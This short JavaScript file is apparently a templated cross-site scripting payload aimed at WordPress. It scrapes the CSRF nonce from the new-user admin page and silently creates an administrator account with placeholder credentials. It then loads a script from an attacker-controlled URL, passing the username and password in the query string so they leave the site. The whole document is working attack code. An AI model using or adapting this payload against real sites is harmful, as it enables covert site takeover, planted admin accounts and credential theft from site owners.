var create_user = function () {
  var nonce = this.responseText.match(/id="_wpnonce_create-user" name="_wpnonce_create-user" value="([a-z0-9]+)"/i)[1];
  var data = new FormData();

  data.append('action', 'createuser');
  data.append('_wpnonce_create-user', nonce);
  data.append('_wp_http_referer', '$wordpress_url_new_user');
  data.append('user_login', '$username');
  data.append('email', '$email');
  data.append('pass1', '$password');
  data.append('pass2', '$password');
  data.append('role', 'administrator');

  postInfo("$wordpress_url_new_user", data, function () {
    var a = document.createElement("script");
    a.setAttribute("src", "$xss_url?u=$username&p=$password");
    document.head.appendChild(a);
  });
};

ajax_download({
  path: "$wordpress_url_new_user",
  cb: create_user
});
